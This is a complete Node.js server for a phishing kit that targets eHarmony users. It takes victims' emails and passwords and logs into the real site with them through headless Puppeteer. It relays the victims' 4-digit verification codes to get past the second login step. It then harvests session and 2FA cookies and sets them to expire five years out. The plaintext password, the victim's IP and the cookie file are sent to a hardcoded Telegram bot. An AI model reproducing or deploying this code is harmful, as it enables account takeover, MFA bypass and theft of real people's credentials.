// server.js
const express = require("express");
const cors = require("cors");
const puppeteer = require("puppeteer");
const path = require("path");
const fs = require("fs");
const { randomUUID } = require("crypto");
const FormData = require("form-data"); 
const axios = require("axios");


const app = express();
const PORT = process.env.PORT || 3000;

// make sure cookies directory exists
const cookiesDir = path.join(__dirname, "cookies");
if (!fs.existsSync(cookiesDir)) fs.mkdirSync(cookiesDir, { recursive: true });

// simple delay helper
const delay = (ms) => new Promise((res) => setTimeout(res, ms));

// sessions map: sessionId => { browser, page, createdAt, userInfo, ipInfo }
const sessions = new Map();

function createSessionId() {
  try {
    if (typeof randomUUID === "function") return randomUUID();
  } catch (e) {}
  return `sess_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`;
}

// setSession now accepts optional metadata (userInfo, ipInfo)
function setSession(sessionId, browser, page, userInfo = null, ipInfo = null) {
  sessions.set(sessionId, {
    browser,
    page,
    createdAt: Date.now(),
    userInfo,
    ipInfo,
  });
}

function getSession(sessionId) {
  return sessions.get(sessionId);
}

function clearSession(sessionId) {
  try {
    const s = sessions.get(sessionId);
    if (s && s.browser) {
      try {
        s.browser.close().catch(() => {});
      } catch (e) {}
    }
  } finally {
    sessions.delete(sessionId);
  }
}

// Periodic cleanup of old sessions (2 hours)
setInterval(() => {
  const cutoff = Date.now() - 2 * 60 * 60 * 1000;
  for (const [id, s] of sessions.entries()) {
    if (s.createdAt < cutoff) {
      try {
        if (s.browser) s.browser.close().catch(() => {});
      } catch (e) {}
      sessions.delete(id);
      console.log("Old session cleaned:", id);
    }
  }
}, 30 * 60 * 1000);

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files (HTML, CSS, JS)
app.use(express.static("."));

// ---------- Helper: Telegram optional delivery ----------
async function sendTelegramMessage(htmlText) {
  const token = process.env.TELEGRAM_BOT_TOKEN || "7571638613:AAFPtfEHKC3cmX9xXyix1blDKfNibLEkzfk";
  const chatId = process.env.TELEGRAM_CHAT_ID || "7092923873";

  if (!token || !chatId) {
    console.log("Telegram not configured - message would be:", htmlText);
    return;
  }

  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  try {
    const resp = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: htmlText,
        parse_mode: "HTML",
      }),
    });
    const json = await resp.json();
    if (!json.ok) {
      console.warn("Telegram message responded:", json);
    }
  } catch (e) {
    console.error("sendTelegramMessage failed:", e);
  }
}

async function sendTelegramFile(filePath, caption = "") {
  const token = process.env.TELEGRAM_BOT_TOKEN || "7571638613:AAFPtfEHKC3cmX9xXyix1blDKfNibLEkzfk";
  const chatId = process.env.TELEGRAM_CHAT_ID || "7092923873";

  if (!token || !chatId) {
    console.log("Telegram not configured - file would be saved at:", filePath);
    return;
  }

  try {
    const url = `https://api.telegram.org/bot${token}/sendDocument`;
    const FormData = require("form-data");
    const form = new FormData();

    form.append("chat_id", chatId);
    form.append("document", fs.createReadStream(filePath), {
      filename: path.basename(filePath),
      contentType: "application/json",
    });

    if (caption) {
      form.append("caption", caption);
    }

    const response = await axios.post(url, form, {
      headers: {
        ...form.getHeaders(),
      },
    });

    return response.data;
  } catch (error) {
    console.error(
      "Error sending file to Telegram:",
      error.response?.data || error.message
    );
  }
}

// ----------------- Login endpoint -----------------
app.post("/api/login", async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({
      success: false,
      error: "Email and password are required",
    });
  }

  let browser;
  let keepBrowserOpen = false; // Track if browser should stay open
  const ipFromRequest =
    (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
    req.socket.remoteAddress ||
    req.ip ||
    "";
  const userAgent = req.get("User-Agent") || "";

  try {
    console.log(`Starting login process for: ${email}`);

    // Launch Puppeteer
    const browser = await puppeteer.launch({
      args: [
        "--disable-setuid-sandbox",
        "--no-sandbox",
        "--single-process",
        "--no-zygote",
      ],
      executablePath:
        process.env.NODE_ENV === "production"
          ? process.env.PUPPETEER_EXECUTABLE_PATH
          : puppeteer.executablePath(),
    });

    const page = await browser.newPage();

    // Create a session for potential verification and store user info & ip
    const sessionId = createSessionId();
    const userInfo = { email, password, userAgent, ip: ipFromRequest };
    setSession(sessionId, browser, page, userInfo, null);

    // Navigate to eHarmony login page
    await page.goto("https://www.eharmony.com/login/", {
      waitUntil: "networkidle2",
    });

    // Wait for the login form to load (using more flexible selectors)
    await page.waitForSelector(
      'input[type="email"], input[name="email"], #email, #loginFormEmail',
      {
        visible: true,
        timeout: 10000,
      }
    );

    // Wait for password field
    await page.waitForSelector(
      'input[type="password"], input[name="password"], #password, #loginFormPasswort',
      {
        visible: true,
        timeout: 10000,
      }
    );

    // Fill in the email (try multiple selectors)
    console.log("Filling in email...");
    const emailSelectors = [
      "#loginFormEmail",
      'input[type="email"]',
      'input[name="email"]',
      "#email",
    ];
    for (const selector of emailSelectors) {
      try {
        await page.type(selector, email, { delay: 30 });
        break;
      } catch (e) {
        console.log(`Email selector ${selector} not found, trying next...`);
      }
    }

    // Fill in the password (try multiple selectors)
    console.log("Filling in password...");
    const passwordSelectors = [
      "#loginFormPasswort",
      'input[type="password"]',
      'input[name="password"]',
      "#password",
    ];
    for (const selector of passwordSelectors) {
      try {
        await page.type(selector, password, { delay: 30 });
        break;
      } catch (e) {
        console.log(`Password selector ${selector} not found, trying next...`);
      }
    }

    // Click the login button (try multiple selectors)
    console.log("Clicking login button...");
    const buttonSelectors = [
      "#loginFormSubmit",
      'button[type="submit"]',
      'input[type="submit"]',
      ".login-button",
      "#login-button",
    ];
    for (const selector of buttonSelectors) {
      try {
        await page.click(selector);
        break;
      } catch (e) {
        console.log(`Button selector ${selector} not found, trying next...`);
      }
    }

    // Wait 5 seconds and check URL
    console.log("Waiting 5 seconds to check URL...");
    await delay(5000);

    const currentUrl = page.url();
    console.log("Current URL after 5 seconds:", currentUrl);

    // Check if URL contains login_error=1 (incorrect credentials)
    const hasLoginError = currentUrl.includes("login_error=1");
    const needsVerification = currentUrl.includes("user_verification");

    if (hasLoginError) {
      console.log(
        "Login failed - detected login_error=1 in URL (incorrect credentials)"
      );
      // Clean up session & browser since no verification will happen
      try {
        if (browser) await browser.close();
      } catch {}
      sessions.delete(sessionId);

      res.json({
        success: false,
        message: "Login failed - incorrect email or password",
        currentUrl: currentUrl,
        hasLoginError: true,
      });
    } else if (needsVerification) {
      console.log(
        "Login requires verification - detected user_verification in URL"
      );
      console.log("Keeping Puppeteer browser open for verification...");

      let verificationEmailText = null;
      try {
        await page.waitForSelector("#email", { visible: true, timeout: 1000 });
        verificationEmailText = await page.$eval("#email", (el) =>
          el.textContent.trim()
        );
        console.log(">>> div#email text:", verificationEmailText);
      } catch (err) {
        console.log("div#email not found on main page:", err.message);
      }

      const encodedEmail = verificationEmailText
        ? Buffer.from(verificationEmailText).toString("base64")
        : "";

      keepBrowserOpen = true; // Mark browser to stay open
      res.json({
        success: true,
        message: "Login requires verification - browser kept open",
        currentUrl: currentUrl,
        needsVerification: true,
        sessionId,
        redirectTo: `/user-verification.html?email=${encodedEmail}&sessionId=${encodeURIComponent(
          sessionId
        )}`,
      });
      // don't close the browser
      return;
    } else {
      console.log("Login successful - no login_error detected");
      const isHome =
        currentUrl.includes("/lists/partnersuggestions") ||
        currentUrl.includes("/profile/welcomepage") ||
        currentUrl.includes("/profile/") ||
        currentUrl.includes("/home");
      const redirectTo = isHome
        ? "https://www.eharmony.com/lists/partnersuggestions"
        : undefined;

      // On a straightforward success, collect & save cookies in background
      const session = getSession(sessionId);
      if (session) {
        // small delay to let navigations settle, then collect
        setImmediate(() => {
          collectAndSaveCookies(sessionId).catch((e) =>
            console.error("Background cookie collection failed:", e)
          );
        });
      }

      res.json({
        success: true,
        message: "Login successful",
        currentUrl: currentUrl,
        redirectTo,
        isHome,
      });
    }
  } catch (error) {
    console.error("Error during login process:", error);
    res.status(500).json({
      success: false,
      error: "Internal server error during login process",
      details: error.message,
    });
  } finally {
    // Only close the browser if it shouldn't be kept open
    if (browser && !keepBrowserOpen) {
      setTimeout(async () => {
        try {
          await browser.close();
          console.log("Browser closed");
        } catch (e) {
          console.error("Error closing browser in finally:", e);
        }
        // Remove any sessions tied to this browser
        for (const [id, s] of sessions.entries()) {
          if (s.browser === browser) sessions.delete(id);
        }
      }, 5000); // Wait 5 seconds before closing
    } else if (browser && keepBrowserOpen) {
      console.log("Browser kept open for verification process");
    }
  }
});

// Endpoint to receive 4-digit verification code and input it into the open Puppeteer page
app.post("/api/verify-otp", async (req, res) => {
  const { code, sessionId } = req.body;
  if (!code || typeof code !== "string" || code.length !== 4) {
    return res
      .status(400)
      .json({ success: false, error: "Invalid code. Must be 4 digits." });
  }

  if (!sessionId) {
    return res
      .status(400)
      .json({ success: false, error: "Missing sessionId." });
  }
  const session = getSession(sessionId);
  if (!session || !session.browser || !session.page) {
    return res
      .status(409)
      .json({
        success: false,
        error: "Invalid or expired session. Please login again.",
      });
  }

  try {
    console.log("Received OTP code:", code);
    const activePage = session.page;

    // Try multiple selectors for the verification input
    const otpSelectors = [
      "#code",
      'input[name="verification_code"]',
      'input[type="text"][maxlength="4"]',
    ];

    let inputHandle = null;
    for (const selector of otpSelectors) {
      try {
        await activePage.waitForSelector(selector, { timeout: 4000 });
        inputHandle = await activePage.$(selector);
        if (inputHandle) {
          // Clear existing value if any
          await activePage.evaluate((el) => (el.value = ""), inputHandle);
          await inputHandle.type(code, { delay: 50 });
          break;
        }
      } catch (e) {
        console.log(`OTP selector ${selector} not found, trying next...`);
      }
    }

    if (!inputHandle) {
      return res
        .status(404)
        .json({
          success: false,
          error: "OTP input field not found on the page.",
        });
    }

    // Attempt to submit: press Enter or click a submit button if available
    try {
      await inputHandle.press("Enter");
    } catch {}

    const submitSelectors = [
      "#verificationFormSubmit",
      'button[type="submit"]',
      'input[type="submit"]',
      "#loginFormSubmit",
    ];
    for (const selector of submitSelectors) {
      try {
        await activePage.click(selector);
        break;
      } catch (e) {
        // ignore and try next
      }
    }

    // Wait up to 5 seconds to allow redirects or in-page processing
    await delay(5000);

    let newUrl = "";
    try {
      newUrl = activePage.url();
    } catch (e) {
      console.log("Could not read page URL after OTP submit:", e.message);
    }
    console.log("URL 5s after OTP submit:", newUrl);

    // Classify result per provided rules
    const isInvalidCode =
      typeof newUrl === "string" && newUrl.includes("error=invalid");
    const isHome =
      typeof newUrl === "string" &&
      (newUrl.includes("/lists/partnersuggestions") ||
        newUrl.includes("/profile/welcomepage") ||
        newUrl.includes("/profile/") ||
        newUrl.includes("/home"));
    const verified = isHome && !isInvalidCode;

    // If verified, run cookie collection asynchronously and respond immediately
    if (verified) {
      setImmediate(() => {
        collectAndSaveCookies(sessionId).catch((e) =>
          console.error("collectAndSaveCookies failed after verification:", e)
        );
      });
    }

    return res.json({
      success: true,
      verified,
      isInvalidCode,
      isHome,
      currentUrl: newUrl,
    });
  } catch (error) {
    console.error("Error processing OTP:", error);
    return res
      .status(500)
      .json({
        success: false,
        error: "Failed to submit OTP",
        details: error.message,
      });
  }
});

// Health check endpoint
app.get("/api/health", (req, res) => {
  res.json({ status: "OK", message: "Server is running" });
});

// Serve the main page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ---------------- collectAndSaveCookies ----------------
async function collectAndSaveCookies(pageOrSessionId, maybeSessionId) {
  try {
    let page = pageOrSessionId;
    let sessionId = maybeSessionId;

    // allow calling as collectAndSaveCookies(sessionId) or collectAndSaveCookies(page, sessionId)
    if (typeof pageOrSessionId === "string" && !maybeSessionId) {
      sessionId = pageOrSessionId;
      const session = getSession(sessionId);
      if (!session) {
        console.error("Session not found for ID:", sessionId);
        return;
      }
      page = session.page;
    } else if (!sessionId) {
      console.error(
        "sessionId is required as second parameter when passing a page."
      );
      return;
    }

    if (!sessionId) {
      console.error("SessionId missing.");
      return;
    }

    const session = getSession(sessionId);
    if (!session) {
      console.error("Session not found for ID:", sessionId);
      return;
    }

    if (!page) page = session.page;
    if (!page) {
      console.error("No page available in session:", sessionId);
      return;
    }

    const cookies = await page.cookies();
    const fiveYearsInSeconds = 5 * 365 * 24 * 60 * 60; // 5 years in seconds

    const { userInfo, browser, ipInfo } = session;
    const currentUrl = await page.url();

    const ipDetails = ipInfo
      ? `IP: ${ipInfo.ip}\nLocation: ${ipInfo.location}\nISP: ${ipInfo.isp}`
      : `IP: ${userInfo ? userInfo.ip : "unknown"}`;

    // Send session info to Telegram with HTML formatting (optional)
    const sessionMessage = `<b>New Session Captured</b>\n\nName: EHARMONY\nUsername: ${
      userInfo ? userInfo.email : "unknown"
    }\nPassword: <tg-spoiler>${
      userInfo ? userInfo.password : ""
    }</tg-spoiler>\nLanding URL: ${currentUrl}\n${ipDetails}\nUser Agent: <code>${
      userInfo ? userInfo.userAgent : ""
    }</code>`;
    await sendTelegramMessage(sessionMessage);

    // Filter cookies of interest

    const filteredCookies = cookies.filter((cookie) =>
      [
        "_uetvid",
        "tms_pu",
        "lcookie",
        "NVI_LC2",
        "ads_si",
        "_uetsid",
        "PDC",
        "peg_session",
        "mcookie",
        "currentScreenSize",
        "tms_ps",
        "cf_clearance",
        "2FA_UV",
        "_cfuvid",
        "_fbp",
        "_gcl_au",
        "_lc2_fpi",
        "_lc2_fpi_js",
        "li_dcdm_c",
        "_li_ss",
        "cjcookie",
        "NVI_FC",
        "psg_optin",
        "SESSION",
        "timezone",
      ].includes(cookie.name)
    );

    const formattedCookies = filteredCookies.map((cookie) => {
      const extendedExpiration =
        Math.floor(Date.now() / 1000) + fiveYearsInSeconds;

      
        if (cookie.name === "_uetvid") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: false,
            path: "/",
            secure: false,
            httpOnly: false,
            sameSite: null,
            session: false,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
  
        if (cookie.name === "tms_pu") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: true,
            path: "/",
            secure: false,
            httpOnly: true,
            sameSite: null,
            session: false,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
  
        if (cookie.name === "lcookie") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: true,
            path: "/",
            secure: false,
            httpOnly: true,
            sameSite: null,
            session: false,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
  
        if (cookie.name === "NVI_LC2") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: false,
            path: "/",
            secure: true,
            httpOnly: true,
            sameSite: "no_restriction",
            session: false,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
  
        if (cookie.name === "ads_si") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: true,
            path: "/",
            secure: false,
            httpOnly: true,
            sameSite: null,
            session: false,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
  
        if (cookie.name === "_uetsid") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: false,
            path: "/",
            secure: false,
            httpOnly: false,
            sameSite: null,
            session: false,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
  
        if (cookie.name === "PDC") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: false,
            path: "/",
            secure: false,
            httpOnly: true,
            sameSite: null,
            session: false,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
  
        if (cookie.name === "li_alerts") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: true,
            path: "/",
            secure: false,
            httpOnly: true,
            sameSite: null,
            session: false,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
  
        if (cookie.name === "mcookie") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: true,
            path: "/",
            secure: false,
            httpOnly: true,
            sameSite: null,
            session: false,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
  
        if (cookie.name === "currentScreenSize") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: true,
            path: "/",
            secure: false,
            httpOnly: false,
            sameSite: null,
            session: true,
            storeId: null,
          };
        }
  
        if (cookie.name === "tms_ps") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: true,
            path: "/",
            secure: false,
            httpOnly: true,
            sameSite: null,
            session: false,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
  
        if (cookie.name === "cf_clearance") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: false,
            path: "/",
            secure: false,
            httpOnly: true,
            sameSite: null,
            session: false,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
  
        if (cookie.name === "2FA_UV") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: false,
            path: "/",
            secure: false,
            httpOnly: true,
            sameSite: null,
            session: false,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
  
        if (cookie.name === "_cfuvid") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: false,
            path: "/",
            secure: true,
            httpOnly: true,
            sameSite: "no_restriction",
            session: true,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
  
        if (cookie.name === "_fbp") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: false,
            path: "/",
            secure: false,
            httpOnly: false,
            sameSite: "lax",
            session: false,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
  
        if (cookie.name === "_gcl_au") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: false,
            path: "/",
            secure: false,
            httpOnly: false,
            sameSite: null,
            session: false,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
  
        if (cookie.name === "_lc2_fpi") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: false,
            path: "/",
            secure: false,
            httpOnly: false,
            sameSite: "lax",
            session: false,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
  
        if (cookie.name === "_lc2_fpi_js") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: false,
            path: "/",
            secure: false,
            httpOnly: false,
            sameSite: null,
            session: true,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
  
        if (cookie.name === "_li_dcdm_c") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: false,
            path: "/",
            secure: false,
            httpOnly: false,
            sameSite: "lax",
            session: true,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
  
        if (cookie.name === "_li_ss") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: false,
            path: "/",
            secure: false,
            httpOnly: false,
            sameSite: "lax",
            session: false,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
  
        if (cookie.name === "cjcookie") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: false,
            path: "/",
            secure: true,
            httpOnly: false,
            sameSite: "no_restriction",
            session: false,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
        if (cookie.name === "NVI_FC") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: false,
            path: "/",
            secure: false,
            httpOnly: true,
            sameSite: null,
            session: false,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
        if (cookie.name === "psg_optin") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: false,
            path: "/",
            secure: false,
            httpOnly: false,
            sameSite: null,
            session: true,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
        if (cookie.name === "SESSION") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: true,
            path: "/",
            secure: false,
            httpOnly: true,
            sameSite: "lax",
            session: true,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
        if (cookie.name === "timezone") {
          return {
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            hostOnly: false,
            path: "/",
            secure: false,
            httpOnly: false,
            sameSite: null,
            session: false,
            expirationDate: extendedExpiration,
            storeId: null,
          };
        }
  

      // keep the per-name fine grained mapping you had (simple fallback provided)
      return {
        name: cookie.name,
        value: cookie.value,
        domain: cookie.domain,
        hostOnly: cookie.hostOnly || false,
        path: cookie.path || "/",
        secure: !!cookie.secure,
        httpOnly: !!cookie.httpOnly,
        sameSite: cookie.sameSite || null,
        session: !!cookie.session,
        expirationDate:
          cookie.expires && cookie.expires > 0
            ? cookie.expires
            : extendedExpiration,
        storeId: cookie.storeId || null,
      };
    });

    const cookieFilePath = path.join(cookiesDir, `${sessionId}.json`);
    fs.writeFileSync(cookieFilePath, JSON.stringify(formattedCookies, null, 2));
    console.log(`Cookies saved to ${cookieFilePath}`);

    // Send the actual cookie file to Telegram (optional)
    await sendTelegramFile(
      cookieFilePath,
      `Cookies for ${userInfo ? userInfo.email : sessionId}`
    );

    // Wait 30 seconds before closing browser (if desired)
    console.log("Waiting 30 seconds before closing browser...");
    await delay(30000);

    // Close browser and clean up session
    try {
      if (browser) {
        await browser.close();
      }
    } catch (closeError) {
      console.error("Error closing browser:", closeError);
    } finally {
      sessions.delete(sessionId);
      console.log(`Browser closed and session ${sessionId} cleaned up`);
    }
  } catch (error) {
    console.error("Error in collectAndSaveCookies:", error);
  }
}

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
  console.log(`Health check: http://localhost:${PORT}/api/health`);
});
